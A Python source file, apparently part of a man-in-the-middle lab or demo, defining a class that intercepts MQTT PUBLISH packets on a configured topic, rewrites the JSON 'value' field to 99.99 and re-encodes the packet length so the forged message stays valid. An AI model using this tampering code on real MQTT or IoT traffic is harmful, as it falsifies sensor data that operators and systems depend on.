import re

from common.config import TOPIC

PUBLISH = 3

# Match both double-quoted and single-quoted JSON values
VALUE_PATTERN = re.compile(rb"""["']value["']\s*:\s*[\d.]+""")
TAMPERED_VALUE = b'"value": 99.99'


class PacketTamperer:
    @staticmethod
    def encode_remaining_length(n: int) -> bytes:
        out = bytearray()
        while True:
            digit = n % 128
            n //= 128
            if n > 0:
                digit |= 0x80
            out.append(digit)
            if n == 0:
                break
        return bytes(out)

    @staticmethod
    def tamper_publish(packet: bytes) -> bytes:
        """Rewrite the JSON value inside a PUBLISH packet, keeping MQTT framing valid."""
        if len(packet) < 2:
            return packet
        first = packet[0]
        if (first >> 4) != PUBLISH:
            return packet

        multiplier = 1
        remaining = 0
        i = 1
        while True:
            if i >= len(packet):
                return packet
            byte = packet[i]
            remaining += (byte & 0x7F) * multiplier
            i += 1
            if not (byte & 0x80):
                break
            multiplier *= 128
        body_start = i
        body = packet[body_start:]

        if len(body) < 2:
            return packet
        topic_len = int.from_bytes(body[0:2], "big")
        topic_end = 2 + topic_len
        if len(body) < topic_end:
            return packet
        topic = body[2:topic_end]
        if topic != TOPIC.encode():
            return packet

        qos = (first >> 1) & 0x03
        pid_len = 2 if qos > 0 else 0
        payload_start = topic_end + pid_len
        payload = body[payload_start:]

        new_payload = VALUE_PATTERN.sub(TAMPERED_VALUE, payload)
        if new_payload == payload:
            return packet

        new_body = body[:payload_start] + new_payload
        new_header = bytes([first]) + PacketTamperer.encode_remaining_length(
            len(new_body)
        )
        tampered = new_header + new_body

        print(f"[PacketTamperer] Actual Payload   -> {payload}")
        print(f"[PacketTamperer] tampered Payload -> {new_payload}")
        return tampered
